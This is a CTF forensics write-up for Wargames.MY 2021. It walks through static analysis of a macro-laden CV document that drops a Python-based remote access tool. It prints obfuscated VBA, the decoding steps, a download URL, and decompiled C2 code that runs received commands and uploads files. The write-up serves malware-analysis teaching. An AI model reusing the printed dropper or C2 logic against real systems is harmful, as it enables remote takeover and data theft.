---
layout: post
title: forensics
ctf: Wargames.MY 2021
permalink: /wargamesmy-21/forensics
---

This was a series of challenges based on a malware sample. Very cool challenge by [NetByteSec](http://www.netbytesec.com/). I really loved it.

We were first given a [zip file][challenge], which contains an `.eml` file.

```
root:forensics/ # sha256sum \[Job\ Application\]\ Security\ Engineer.eml
f4053a1aca84638b565c5f941a21b9484772520d7536e31ca41de0deaee14e2c  [Job Application] Security Engineer.eml
```

`wgmy{f4053a1aca84638b565c5f941a21b9484772520d7536e31ca41de0deaee14e2c}`

And this is where we start.

### Hash of Document

Next we have to find the hash of the attached document. Since an `.eml` file is a saved email, we can use `mpack` to extract its contents.

```
apt install -y mpack
munpack *.eml
```

```
root:forensics/ # sha1sum CV_Abdul_Manab.doc
706301fc19042ffcab697775c30fe7dd9db4c5a6  CV_Abdul_Manab.doc
```

`wgmy{706301fc19042ffcab697775c30fe7dd9db4c5a6}`

### VB Malware

This doc contains a Visual Basic malware written as a macro.

As this was a forensics challenge, we needed to find IOCs which can be done by running the malware in a VM, and using tools like Wireshark. I was interested to see the malware implementation, so I tried static analysis instead :P.

#### Macro

To extract the VB macro code, I used `olevba`.

```plaintext
❯ olevba ~/ctfs/wargames21/forensics/CV_Abdul_Manab.doc | head
olevba 0.56 on Python 3.9.7 - http://decalage.info/python/oletools
===============================================================================
FILE: /Users/daniellimws/ctfs/wargames21/forensics/CV_Abdul_Manab.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: /Users/daniellimws/ctfs/wargames21/forensics/CV_Abdul_Manab.doc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


Sub ParagraphExample()
    Dim oPara As Paragraph
    Set oPara = ActiveDocument.Paragraphs(1)
    MsgBox oPara.Range.Text
    oPara.Range.InsertParagraphBefore 'Insert Paragraph
    MsgBox oPara.Range.Text
End Sub


Sub LoopThroughParagraphs()

    Dim oPara As Paragraph
    For Each oPara In ActiveDocument.Paragraphs
        'do something with it. We will just display
        'paragraph text if its style is "Heading 4"
        If oPara.Style = "Heading 4" Then
            MsgBox oPara.Range.Text
        End If
    Next oPara

End Sub
...
```

As I scrolled down, I begin to see some obfuscated code like:

```plaintext
Sub UoasNbaeRtslFl()
Dim AgotEoaiMarsEbine As Paragraph
Set AgotEoaiMarsEbine = ActiveDocument.Paragraphs(1)
MsgBox AgotEoaiMarsEbine.Range.Text
AgotEoaiMarsEbine.Range.InsertParagraphBefore
MsgBox AgotEoaiMarsEbine.Range.Text
End Sub
Sub KrtbRa()
Dim AgotEoaiMarsEbine As Paragraph
For Each AgotEoaiMarsEbine In ActiveDocument.Paragraphs
If AgotEoaiMarsEbine.Style = OtrpOlvrHtgdOt("48656164696e") & OtrpOlvrHtgdOt("672034") Then
MsgBox AgotEoaiMarsEbine.Range.Text
End If
Next AgotEoaiMarsEbine
End Sub

Private Sub PnenIkmeUitrv(EoeoCi_aBma As String, EchnUaupAyapCbslNo As Integer)
Dim UtkeNhciUdgaTosl As Object
Dim Eg_nTklcUiuoFt As String
Dim AlnwBfawEo As String
AlnwBfawEo = OtrpOlvrHtgdOt("57536372")
AlnwBfawEo = AlnwBfawEo & OtrpOlvrHtgdOt("6970") & OtrpOlvrHtgdOt("742e53")
AlnwBfawEo = AlnwBfawEo & OtrpOlvrHtgdOt("68656c6c")
Set UtkeNhciUdgaTosl = CreateObject(AlnwBfawEo)
Eg_nTklcUiuoFt = OtrpOlvrHtgdOt("484b45595f43555252454e545f555345525c536f6674776172655c4d6963726f736f66745c4f66666963") & OtrpOlvrHtgdOt("655c5c") & EoeoCi_aBma & OtrpOlvrHtgdOt("5c457863656c5c53656375726974795c41636365") & OtrpOlvrHtgdOt("737356424f4d")
UtkeNhciUdgaTosl.RegWrite Eg_nTklcUiuoFt, EchnUaupAyapCbslNo, OtrpOlvrHtgdOt("524547") & OtrpOlvrHtgdOt("5f44574f5244")
End Sub
```

#### Code from strings

Definitely not readable 😅 But I do notice an interesting function. Note that there are many calls to `OtrpOlvrHtgdOt`, e.g.

* `OtrpOlvrHtgdOt("50726976617465")`
* `OtrpOlvrHtgdOt("2053756220576f726b626f6f6b5f4e6577536865657428427956616c20526f65724f696e65556e6c6872204173204f626a65637429")`
* `OtrpOlvrHtgdOt("456e6420")`

And this function takes in something that looks like a hex-encoded string. And if I hex-decode the 3 strings above, I get:

* `Private`
* ` Sub Workbook_NewSheet(ByVal RoerOineUnlhr As Object)`
* `End `

So... the macro is most likely unpacking code from strings, and then it will run the unpacked code later. I decided to unhex all the strings passed to `OtrpOlvrHtgdOt`. Wrote a simple script to do so:

```py
import re
from binascii import unhexlify
from base64 import b64decode

pattern = b'OtrpOlvrHtgdOt\("(\S+)"\)'
vba = open("olevba", "rb").read()

founds = re.findall(pattern, vba)
for found in founds:
    unhex = unhexlify(found)
    print(unhex.decode())
```

And I get the following strings (there's a lot!). Here are some interesting ones:

```plaintext
...
App
lica
tion
DQoNCiAgICAgICAgICAgICAgICAgICAgRGVjbGFyZSBQdHJTYWZlIEZ1bmN0aW
9uIEdldE1vZHVsZUhhbmRsZUEgTGliICJrZXJuZWwzMiIgKEJ5VmFsIE9wcnBVYWlhVGx0c0l0ZW9UbiBBcyBTdHJpbmcpIEFzIExvbmdQdHINCkRlY2xhcmUgUHRyU2FmZSBGdW5jdGlvbiBHZXRQcm9jQWRkcmVzcyBMaWIgImtlcm5lbDMyIiAoQnlWYWwgV21vdFNlX2JFdHJlR3Jscm8gQXMgTG9uZ1B0ciwgQnlWYWwgT3Vpd01lbXJZYW5hX3JtaXUgQXMgU3RyaW5nKSBBcyBMb25nUHRyDQpEZWNsYXJlIFB0clNhZmUgRnVuY3Rpb24gRGlzcENh
bGxGdW5jIExpYiAiT2xlQXV0MzIuZGxsIiAoQnlWYWwgT2l1YVNocG5IYXRkT19rbyBBcyBMb25nUHRyLCBCeVZhbCBMc2FsUG5wclRscmVpIEFzIExvbmdQdHIsIEJ5VmFsIEFpZXRHYV9oTHBhb0NvbWNvIEFzIE
xvbmdQdHIsIEJ5VmFsIEl0bnNMc3VuYSBBcyBJbnRlZ2VyLCBCeVZhbCBFYWhkS2F2dUhpZyBBcyBMb25nLCBCeVJlZiBBdm93TmhnX1RtdHZFbSBBcyBJbnRlZ2VyLCBCeVJlZiBVaWxlTWxzb2YgQXMgTG9uZ1B0ciwgQnlSZWYgQ3V0cklrb3VFbG5jbCBBcyBWYXJpYW50KSBBcyBMb25nUHRyDQpEZWNsYXJlIFB0
clNhZmUgRnVuY3Rpb24gTG9hZExpYnJhcnkgTGliICJrZXJuZWwzMiIgQWxpYXMgIkxvYWRMaWJyYXJ5QSIgKEJ5VmFsIFJlbnZUdSBBcyBTdHJpbmcpIEFzIExvbmdQdHINCg0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgDQoNCiAgICAgICAgICAgICAgICAgICAgRnVuY3Rpb24gRGhrbE1hb2l0KEJ5VmFsIHZDb2RlKQ0KRGltIF
Jlb3NJbmRhVG9pdEFvaXVuLCBJYXVuRWxvdUJhZXdHdm4NCkRpbSBFaGRyRW11b1lpYmdSc2ggQXMgU3RyaW5nDQpFaGRyRW11b1lpYmdSc2ggPSBDdGRjSXBlYkFr
ZWxHaSgiNGQ3Mzc4NmQiKQ0KRWhkckVtdW9ZaWJnUnNoID0gRWhkckVtdW9ZaWJnUnNoICYgQ3RkY0lwZWJBa2VsR2koIjZjMzIyZSIpICYgQ3RkY0lwZWJBa2VsR2koIjQ0NGYiKQ0KRWhkckVtdW9ZaWJnUnNoID0gRWhkckVtdW9ZaWJnUnNoICYgQ3RkY0lwZWJBa2VsR2koIjRkNDQ2ZjY
zIikNCkVoZHJFbXVvWWliZ1JzaCA9IEVoZHJFbXVvWWliZ1JzaCAmIEN0ZGNJcGViQWtlbEdpKCI3NTZkNjUiKSAmIEN0ZGNJcGViQWtlbEdpKCI2ZTc0MmUzMzJlMzAiKQ0KU2V0IFJlb3NJbmRhVG9pdEFvaXVuID0gQ3JlYXRlT2JqZWN0
KEVoZHJFbXVvWWliZ1JzaCkNClNldCBJYXVuRWxvdUJhZXdHdm4gPSBSZW9zSW5kYVRvaXRBb2l1bi5DcmVhdGVFbGVtZW50KEN0ZGNJcGViQWtlbEdpKCI2MjYxNzM2NSIpICYgQ3RkY0lwZWJBa2VsR2koIjM2MzQiKSkNCklhdW5FbG91QmFld0d2bi5EYXRhVHlwZSA9IEN0ZGNJcGViQWtlbEdpKCI2MjY5NmUyZTYyNjE3MzY1IikgJiBDdGRjSXBlYkFrZWxHaSgiMzYzNCIpDQpJYXVuRWxvdUJhZXdHdm4uVGV4dCA9IHZDb2RlDQpEaGtsTWFvaXQgPSBTdG5mU2VpckFlbmR
Cb2FldChJYXVuRWxvdUJhZXdHdm4ubm9kZVR5cGVk
VmFsdWUpDQpTZXQgSWF1bkVsb3VCYWV3R3ZuID0gTm90aGluZw0KU2V0IFJlb3NJbmRhVG9pdEFvaXVuID0gTm90aGluZw0KRW5kIEZ1bmN0aW9uDQpQcml2YXRlIEZ1bmN0aW9uIFN0bmZTZWlyQWVuZEJvYWV0KHNvbWVfdmFsdWUpDQpEaW0gUmV1dFJ0b3RJd20gDQpEaW0gTnV0ckhsaWVHdGNhUHNsIEFzIFN0cmluZw0KTnV0ckhsaWVHdGNhUHNsID0gQ3RkY0lwZWJBa2VsR2koIjQxNDQiKQ0KTnV0ckhsaWVHdGNhUHNsID0gTnV0ckhsaWVHdGNhUHNsICYgQ3RkY0lwZWJBa2VsR2koIjRmNDQ0MjJl
IikgJiBDdGRjSXBlYkFr
ZWxHaSgiNTM3NCIpDQpOdXRySGxpZUd0Y2FQc2wgPSBOdXRySGxpZUd0Y2FQc2wgJiBDdGRjSXBlYkFrZWxHaSgiNzI2NTYxNmQiKQ0KU2V0IFJldXRSdG90SXdtID0gQ3JlYXRlT2JqZWN0KE51dHJIbGllR3RjYVBzbCkNClJldXRSdG90SXdtLlR5cGUgPSAxDQpSZXV0UnRvdEl3bS5PcGVuDQpSZXV0UnRvdEl3bS5Xcml0ZSBzb21lX3ZhbHVlDQpSZXV0UnRvdEl3bS5Qb3NpdGlvbiA9ID
ANClJldXRSdG90SXdtLlR5cGUgPSAyIA0KUmV1dFJ0b3RJd20uQ2hhcnNldCA9IEN0ZGNJcGViQWtlbEdpKCI3NTczIikgJiBDdGRjSXBl
YkFrZWxHaSgiMmQ2MTczNjM2OTY5IikNClN0bmZTZWlyQWVu
...
```

There are many strings that look like base64. So I tried to base64-decode each of them. Here is where things get interesting.

On some strings, I successfully base64-decoded them. For example,

```
VmFsdWUpDQpTZXQgSWF1bkVsb3VCYWV3R3ZuID0gTm90aGluZw0KU2V0IFJlb3NJbmRhVG9pdEFvaXVuID0gTm90aGluZw0KRW5kIEZ1bmN0aW9uDQpQcml2YXRlIEZ1bmN0aW9uIFN0bmZTZWlyQWVuZEJvYWV0KHNvbWVfdmFsdWUpDQpEaW0gUmV1dFJ0b3RJd20gDQpEaW0gTnV0ckhsaWVHdGNhUHNsIEFzIFN0cmluZw0KTnV0ckhsaWVHdGNhUHNsID0gQ3RkY0lwZWJBa2VsR2koIjQxNDQiKQ0KTnV0ckhsaWVHdGNhUHNsID0gTnV0ckhsaWVHdGNhUHNsICYgQ3RkY0lwZWJBa2VsR2koIjRmNDQ0MjJl
```

becomes

```
Value)
Set IaunElouBaewGvn = Nothing
Set ReosIndaToitAoiun = Nothing
End Function
Private Function StnfSeirAendBoaet(some_value)
Dim ReutRtotIwm
Dim NutrHlieGtcaPsl As String
NutrHlieGtcaPsl = CtdcIpebAkelGi("4144")
NutrHlieGtcaPsl = NutrHlieGtcaPsl & CtdcIpebAkelGi("4f44422e
```

But this only worked on half of the strings, so it seems like the other half had some other encoding. Either they were encrypted (which malware doesn't normally do, as far as I'm aware of), or there's some other encoding other than base64 happening.

One thing I tried was to take some of the strings, and put them inside CyberChef and used the magic recipe. And wow I found [this recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9-_',true)Rotate_right(2,true)&input=SGFTZ2lOVEkzTnpOa00yUWlLU2tnSmlCRVlYa29kQ2tOQ2xCMWMyTkljbVZoSUQwZ1QyRnBiMVJ2YkdsVWIya29RM1JrWTBsd1pXSkJhMlZzUjJrb0lqVXlOemN6WkROa0lpa3BJQ1lnVFc5dWRHZ29kQ2tOQ2tWMVlXSk9hR3gwWVNBOUlGbGxZWElvZENrTkNrNWxjbXhVYm1OblJXNWhZbE5zWlhSbElEMGdVbWxuYUhRb1EyRm9hVVZ1TENBeUtTQW1JRTloYVc5VWIyeHBWRzlwS0VOMFpHTkpjR1ZpUVd0bGJFZHBLQ0kxTkRVeE0yUXpaQ0lwS1NBbUlGSnBaMmgwS0V4d2JISk5ZV1ZzVG1sd2FVWnVMQ0F5S1NBbUlGOE5DazloYVc5VWIyeHBWRzlwS0VOMFpHTko) that worked 😮

![cyberchef][cyberchef]

So with this, I managed to recover around 20% of the strings. Still got around 30% left. After more trying and trying, I decided to see what happens if I change the **RotateRight** amount to something else for the other strings.

Then 😮 [it worked](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9-_',true)Rotate_right(4,true)&input=TndkR1JqWTJGeVlTQkJjeUJNYjI1bkRRcEVhVzBnUVhKaFkxSjFZWEJUYVcxeUxDQnBiblJsY2xaaGJIVmxJRUZ6SUZOMGNtbHVadzBLUkdsdElIUm9aVk4wWlhCaGN5QkJjeUJKYm5SbFoyVnlEUXAwYUdWVGRHVndZWE1nUFNCTVpXNG9SVzVuYmt4cFpXNHBJQ29nTWcwS1JHbHRJRlJ6WW1kTmNHRnlWV2x5Y3lCQmN5QlRkSEpwYm1jTkNsUnpZbWROY0dGeVZXbHljeUE5SUNJbVNDSU5Da1p2Y2lCRGNIUmtZMk5oY21FZ1BTQXhJRlJ2SUhSb1pWTjBaWEJoY3lCVGRHVndJRFFOQ2tGeVlXTlNkV0Z3VTJsdGNpQTlJRTFwWkVJb1JXNW5ia3hwWlc0c0lFTndkR1JqWTJGeVlTd2dOQ2tOQ2tGeVlXTlM), again.

![cyberchef2][cyberchef2]

With this, I recovered around 15% more of the strings. And once again, changing the amount to 6 helped me recover all the remaining code.

#### Interesting strings

Although the code has been recovered, all the subroutine and variable names are still obfuscated, and there are many hex-encoded strings too. I once again decided to recover these strings and see what's there.

Some interesting strings I found were:

* `Msxml2.DOMDocument.3.0`
* `base64bin.base64`
* `ADODB.stream`
* `wghykqpqxbpbusefktfw`

Not all the strings could be recovered by hex-decoding though. However, one thing they have in common is, they are all passed to this `OaioToliToi` function.

```plaintext
Function OaioToliToi(AgbtEwpiHnyoPugeSe As String) As String
    Dim KictIec As String
    KictIec = DhklMaoit(AgbtEwpiHnyoPugeSe)
    // wghykqpqxbpbusefktfw
    OaioToliToi = TaosTpokNlncSpma(CtdcIpebAkelGi("7767") & CtdcIpebAkelGi("68796b71707178627062757365666b746677"), KictIec)
End Function
```

The `DhklMaoit` function references a string `base64bin.base64` so I guess it's got something to do with base64. And the `TaosTpokNlncSpma` has a loop, along with usage of functions like `Chr`, `Mod`, `Len`, and `Xor`, so I just guessed it most likely is xor decryption. Imagine something that looks like this in Python:

```py
key = "wghykqpqxbpbusefktfw"
encrypted = "..."
decrypted = ""
for i in range(len(encrypted)):
    decrypted += chr(ord(encrypted[i]) % ord(key[i % len(key)])))
```

Putting together a [recipe in CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')From_Base64('A-Za-z0-9-_',true)XOR(%7B'option':'UTF8','string':'wghykqpqxbpbusefktfw'%7D,'Standard',false)&input=NDU3ODQ5NDU0ODQ1NTU2OTQ2NTE0ZDRmNDM3ODRkNDg) to test my theory, my guess was right :D

So here are more interesting strings I recovered:

* `Schedule.Service`
* `\`
* `someid`
* `SystemTime_lks`
* `urlmon` and `URLDownloadToFileA`
* `http://mbnxosod7oj3lm5nky1u.for.wargames.my/cmd64.exe`
* `dsye.exe`
* `Eozilla/4.0 (compatible; MSIE 6.0; Windows N. '£j` (not sure if this is correct)

#### Useful IOCs

These strings gave me enough information to answer the questions by the challenge. Here we go.

**WINAPI to download the malware**

```sh
$ echo -n "urldownloadtofile" | sha1sum
c276cee25db80584ad8f07d39b683baf86a656aa  -
```

`wgmy{c276cee25db80584ad8f07d39b683baf86a656aa}`

**Full URL used to host the malware**

`http://mbnxosod7oj3lm5nky1u.for.wargames.my/cmd64.exe`

```sh
$ echo -n "http://mbnxosod7oj3lm5nky1u.for.wargames.my/cmd64.exe" | sha1sum
e88f4d8ad2551e5c91c742d53229944abd30c5ea  -
```

`wgmy{e88f4d8ad2551e5c91c742d53229944abd30c5ea}`

**Hash of the malware**

```sh
$ sha1sum cmd64.exe
094832f61127bbaaf9857d2e3ca6b3ffd3688e31  cmd64.exe
```

`wgmy{094832f61127bbaaf9857d2e3ca6b3ffd3688e31}`

**xor key used by the macro**

```sh
$ echo -n "wghykqpqxbpbusefktfw" | sha1sum
23a00e2c2bd7e0b493384ea50cbf3e113ee0a1ba  -
```

`wgmy{23a00e2c2bd7e0b493384ea50cbf3e113ee0a1ba}`

### Command & Control

As seen above, the VB macro malware is just a dropper that download the actual malware (**cmd64.exe**) from a server and runs it on the victim's computer.

When getting an exe file, I always run `strings` to see if there's any interesting stuff.

I see a lot of Python-related strings.

```plaintext
Py_FileSystemDefaultEncoding
Py_HasFileSystemDefaultEncoding
Py_FileSystemDefaultEncodeErrors
Py_UTF8Mode
Py_DebugFlag
Py_VerboseFlag
Py_QuietFlag
Py_InteractiveFlag
Py_InspectFlag
Py_OptimizeFlag
Py_NoSiteFlag
Py_BytesWarningFlag
Py_FrozenFlag
Py_IgnoreEnvironmentFlag
Py_DontWriteBytecodeFlag
Py_NoUserSiteDirectory
```

This is just a very small snippet of it. At first, I thought it is a PyInstaller executable, which is sometimes used by malware (and I've done a [challenge](/ctfs/utctf-19/dga/2019-05-05-dga) related to it before). A PyInstaller executable would have the `MEIPASS` string in it, but this executable doesn't. I guess it might be compiled with Cython or something. I took some time to search online but could not find any sure answer.

Then, I decided to look at the .rsrc section of the executable. In Ubuntu, I can use the `wrestool` tool (or the best way is actually to use ResourceHacker on Windows).

```sh
$ wrestool -l cmd64.exe
--type='PYTHON37.DLL' --name=1 --language=0 [offset=0xa0d4 size=3607056]
--type='PYTHONSCRIPT' --name=1 --language=0 [offset=0x37aae4 size=6086]
```

I wanted to see if I can extract the Python source code from the `PYTHONSCRIPT` resource, but I couldn't find any relevant resources on it online. Looking into the file contents, it does contain Python bytecode and looks like marshalled Python objects. I tried to unmarshal them into Python `codeobject`s, so that I can pass them to `decompyle3`, but no matter how hard I tried I kept getting errors. So nvm.

Other than that, looking at the strings, there are many `.pyc` strings.

```plaintext
platform.pycPK
email/message.pycPK
threading.pycPK
signal.pycPK
encodings/mac_roman.pycPK
linecache.pycPK
warnings.pycPK
random.pycPK
__future__.pycPK
shutil.pycPK
operator.pycPK
encodings/mac_turkish.pycPK
unittest/util.pycPK
plistlib.pycPK
email/quoprimime.pycPK
encodings/ascii.pycPK
getpass.pycPK
pprint.pycPK
html/entities.pycPK
email/base64mime.pycPK
typing.pycPK
unittest/result.pycPK
encodings/mac_romanian.pycPK
unittest/main.pycPK
datetime.pycPK
inspect.pycPK
ast.pycPK
mimetypes.pycPK
gettext.pycPK
urllib/request.pycPK
code.pycPK
imp.pycPK
quopri.pycPK
bz2.pycPK
uu.pycPK
urllib/__init__.pycPK
pydoc.pycPK
email/parser.pycPK
email/feedparser.pycPK
html/__init__.pycPK
_compat_pickle.pycPK
_bootlocale.pycPK
stringprep.pycPK
socketserver.pycPK
netrc.pycPK
nturl2path.pycPK
encodings/iso8859_2.pycPK
urllib/error.pycPK
ftplib.pycPK
pickle.pycPK
email/_policybase.pycPK
```

This is good. Because if the executable contains `pyc` files, I can give them to `decompyle3` and it can recover the source code. Furthermore, there's also `PK` in the strings, which sounds like it could be related to zip files.

Turns out I could just use 7zip to extracted out pyz files.

```sh
$ 7z l cmd64.exe

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i5-8259U CPU @ 2.30GHz (806EA),ASM,AES-NI)

Scanning the drive for archives:
1 file, 5920614 bytes (5782 KiB)

Listing archive: cmd64.exe

--
Path = cmd64.exe
Type = zip
Physical Size = 5920614
Embedded Stub Size = 3642880

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-12-09 04:52:34 .....         4308         1878  stat.pyc
2021-12-09 04:52:34 .....         2392         1248  encodings/iso8859_1.pyc
2021-12-09 04:52:34 .....         3373         1712  io.pyc
2021-12-09 04:52:34 .....        15167         7614  sre_compile.pyc
2021-12-09 04:52:34 .....         1418          590  encodings/big5hkscs.pyc
2021-12-09 04:52:34 .....         2521         1291  encodings/cp874.pyc
2021-12-09 04:52:34 .....        10393         5266  posixpath.pyc
2021-12-09 04:52:34 .....         1429          594  encodings/iso2022_jp_1.pyc
2021-12-09 04:52:34 .....         1429          594  encodings/iso2022_jp_3.pyc
2021-12-09 04:52:34 .....         1433          596  encodings/iso2022_jp_ext.pyc
2021-12-09 04:52:34 .....         1578          759  encodings/utf_8.pyc
2019-12-18 23:46:48 .....        23056        12740  select.pyd
2021-12-09 04:52:34 .....         2400         1277  encodings/iso8859_13.pyc
2021-12-09 04:52:34 .....         4690         1869  encodings/utf_32.pyc
2021-12-09 04:52:34 .....         3087         1166  encodings/zlib_codec.pyc
2021-12-09 04:52:34 .....         3240         1608  encodings/uu_codec.pyc
2021-12-09 04:52:34 .....         7259         3645  email/contentmanager.pyc
2021-12-09 04:52:34 .....         1960         1185  json/scanner.pyc
...
```

There's an extracted **__main.pyc__** which looks like it could contain the core program logic.

```sh
$ decompyle3 __main.pyc__
```

Below shows some of the interesting functions:

```py
# decompyle3 version 3.8.0
# Python bytecode 3.7.0 (3394)
# Decompiled from: Python 3.8.10 (default, Jun  2 2021, 10:49:15) 
# [GCC 9.4.0]
# Embedded file name: __main__.pyc
import subprocess, socket, os, platform, base64, json, time
from urllib.parse import urlencode
from urllib.request import Request, urlopen
from itertools import cycle

...

def getData():
    url = 'http://' + getC2() + '/post.php'
    post_fields = {'act': 'get'}
    request = Request(url, (urlencode(post_fields).encode()), headers={'X-ComputerName': getComputerName()})
    return decrypt(json.load(urlopen(request))['data'], 'K719HibejFfel6Jyl4A5TExmIUd2zLF7')

...

def getC2():
    primes = [
     1, 6, 5, 2, 11, 13]
    domain = False
    for nr in range(1, 10):
        domain = 'w'
        for prime in primes:
            domain += getChr(prime * nr)

        domain += '.for.wargames.my'
        nr += 1
        if getIP(domain) != False:
            return domain

def main():
    while True:
        resp = getData()
        data = resp.split(':')
        print(data)
        if data[0] != 'n':
            if data[1] == 'cmd':
                output = run_command(str(data[2]))
                sendData(data[0] + ':' + str(output))
            if data[1] == 'up':
                if os.path.exists(data[2]):
                    uploadFile(data[2])
        time.sleep(10)


if __name__ == '__main__':
    main()
```

And to answer the questions given:

**What is the encryption key?**

```sh
$ echo -n "K719HibejFfel6Jyl4A5TExmIUd2zLF7" | sha1sum
1d6d76404f85b440cf5db734af068a579915c9f2  -
```

`wgmy{1d6d76404f85b440cf5db734af068a579915c9f2}`

**What is the C2 domain?**

Run `getC2()` to obtain `wbgfcln.for.wargames.my`

```sh
$ echo -n "wbgfcln.for.wargames.my" | sha1sum
7c7b739ef14c9f15f41ac73c8301eccd4de8ca9a  -
```

**What is the 2nd C2 domain?**

As seen in the `getC2` function, it generates a domain based on some algorithm, then checks if the domain is live. If not, it tries the next one based on a different seed.

```py
def getC2():
    primes = [
     1, 6, 5, 2, 11, 13]
    domain = False
    for nr in range(1, 10):
        domain = 'w'
        for prime in primes:
            domain += getChr(prime * nr)

        domain += '.for.wargames.my'
        nr += 1
        if getIP(domain) != False:
            return domain
```

To get the 2nd domain, just change the loop to start from `2` (`for nr in range(2, 10)`) since `1` will give `wbgfcln.for.wargames.my` which is live. Doing so gives `whvrotw.for.wargames.my`.

```sh
$ echo -n "whvrotw.for.wargames.my" | sha1sum
8ed3fad58dd5ce65528e787d49ea428dfa8b6632  -
```

`wgmy{8ed3fad58dd5ce65528e787d49ea428dfa8b6632}`


---

This challenge was quite interesting to me because of the many different obfuscation and code packing techniques used, although it most likely wasn't intended to be the main part of the challenge.


[challenge]:{{site.baseurl}}/ctfs/wargamesmy-21/forensics/artifact.zip
[cyberchef]:{{site.baseurl}}/ctfs/wargamesmy-21/forensics/cyberchef.png
[cyberchef2]:{{site.baseurl}}/ctfs/wargamesmy-21/forensics/cyberchef2.png
